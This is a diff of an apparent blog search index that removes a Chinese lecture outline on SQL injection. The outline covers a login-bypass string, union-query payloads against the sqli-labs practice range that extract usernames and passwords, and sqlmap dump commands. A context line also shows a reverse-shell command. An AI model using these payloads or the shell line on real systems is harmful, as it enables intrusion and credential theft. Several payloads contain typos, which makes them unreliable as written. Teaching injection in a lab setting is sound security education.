@@ -339,41 +339,6 @@ bash -i &lt; /dev/tcp/ip/port
 ]]></content>
   </entry>
   <entry>
-    <title>work</title>
-    <url>/2021/01/22/work/</url>
-    <content><![CDATA[<h1 id="讲课大纲："><a href="#讲课大纲：" class="headerlink" title="讲课大纲："></a>讲课大纲：</h1><p>本次大概一个多小时或者更少，讲解内容包含万能密码以及SQL注入中的联合查询注入和sqlmap的简单使用。</p>
-<h2 id="一、万能密码"><a href="#一、万能密码" class="headerlink" title="一、万能密码"></a>一、万能密码</h2><pre><code>对于万能密码就是一个登录框，使用诸如admin&#39; or 1=1 #然后成功绕过密码登录的东西。
-对于admin&#39; or 1=1 #中，admin是自己随便写的，\&#39;是闭合符号，对于闭合符号，在之前sql的学习中应该会有所了解，</code></pre><p>所谓闭合符号一般有四种，<code>&#39;、&quot;、&#39;)、&quot;)</code>。<br>    而平时经常用到的可能就是<code>&#39;</code>和<code>&quot;</code>，毕竟判断这个问题不大。<code>or是一个或的逻辑语句</code>，意思是前面或者后面，而对于后面的1=1肯定正确，然后用sql中的注释<br>符号#进行注释，把后面的密码部分注释掉了，所以判断的条件从原来的用户名=用户名并且密码=密码变为了1=1。<br>    当然在实际生活中，一般是不会这么简单的，这时候你想要进去那就用到的sql注入。</p>
-<h2 id="二、SQL注入之联合查询注入"><a href="#二、SQL注入之联合查询注入" class="headerlink" title="二、SQL注入之联合查询注入"></a>二、SQL注入之联合查询注入</h2><pre><code>首先说一下sql注入产生的原因：</code></pre><p>程序开发过程中不注意书写规范，对sql语句和关键字未进行过滤，导致客户端可以通过全局变量get或者post提交sql语句到服务器端正常运行;<br>    然后sql注入其实有很多种方式，联合查询注入、布尔盲注、时间注入、堆叠注入等等多种方式。这里只介绍简单的联合查询注入。<br>    什么是联合查询注入。<br>    联合查询需要使用的语句：<code>union select --+、order by判断列数、information_schema库包含所有信息以及其他琐碎的就不说了</code>。通过题目讲解一下<br>联合查询注入的方式。<br>    涉及的靶场：<code>sqllabs。</code></p>
-<pre><code>联合查询步骤：
-    1、测试闭合符号
-        有&#39;、&quot;、&#39;)、&quot;)
-    2、判断列数
-        用order by语句判断
-    3、联合查询注入
-        假设列数为三个，首先构造payload为：?id=0&#39; uniuon select 1,2,3--+ #得到回显位置
-                        得到回显位，然后修改payload：?id=0&#39; union select 1,database(),3--+#得到数据库名字
-                        得到数据库名字，接着payload：?id=0&#39;union select 1,group_concat(table_name)from information.schema_tables where table_schema=&#39;&#39;--+#得到数据表名字
-                        得到数据表名称，接着payload：?id=0&#39; union select 1,group_concat(column_name) from information.schema_columns where table_name=&#39;&#39;--+#得到数据表中的字段名称
-                        得到数据表中的字段名称，接着payload：?id=0&#39; union select 1,group_concat(username,0x3a,password),3 from users--+
-        讲解payload的意思。
-        注意内容：information_schema库存放了所有库的信息
-                  information_schema.columns包含了所有表的字段
-                  table_name表名
-                  table_schema数据库名
-                  column_name列名
-                  information_schema.tables包含所有库的表名
-                  group_concat()函数能将相同的行组合起来</code></pre><h2 id="三、sqlmap的简单使用"><a href="#三、sqlmap的简单使用" class="headerlink" title="三、sqlmap的简单使用"></a>三、sqlmap的简单使用</h2><h3 id="sqlmap的简介："><a href="#sqlmap的简介：" class="headerlink" title="sqlmap的简介："></a>sqlmap的简介：</h3><pre><code class="python">        sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，
-    包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。
-        说白了就是利用写好的脚本进行爆破攻击的一个自动化工具，很方便。
-        sqlmap的支持的注入方式：布尔盲注，时间盲注，报错注入，联合查询注入，堆查询注入。</code></pre>
-<h3 id="sqlmap的使用："><a href="#sqlmap的使用：" class="headerlink" title="sqlmap的使用："></a>sqlmap的使用：</h3><pre><code>        其他的不说太多，就讲一下最简单的联合查询无过滤使用
-        获得当前的数据库：sqlmap -u &quot;url&quot; --current-db
-        获得数据库的数据表：sqlmap -u &quot;url&quot; --tables -D&quot;security&quot;
-        获得数据表的字段： sqlmap -u &quot;url&quot; --columns -T&quot;users&quot;-D&quot;security&quot;
-        获得字段的值： sqlmap -u &quot;url&quot; --dump -D&quot;security&quot; -T&quot;users&quot; -C&quot;username,password&quot; --batch --dbms mysql</code></pre>]]></content>
-  </entry>
-  <entry>
     <title>记第一次参加所谓线下awd</title>
     <url>/2020/12/19/%E4%B8%80%E6%AC%A1%E2%80%9C%E7%BA%BF%E4%B8%8Bawd%E2%80%9D%E5%BF%83%E5%BE%97/</url>
     <content><![CDATA[<p>欢迎使用 <strong>{小书匠}(xiaoshujiang)编辑器</strong>，您可以通过 <code>小书匠主按钮&gt;模板</code> 里的模板管理来改变新建文章的内容。</p>
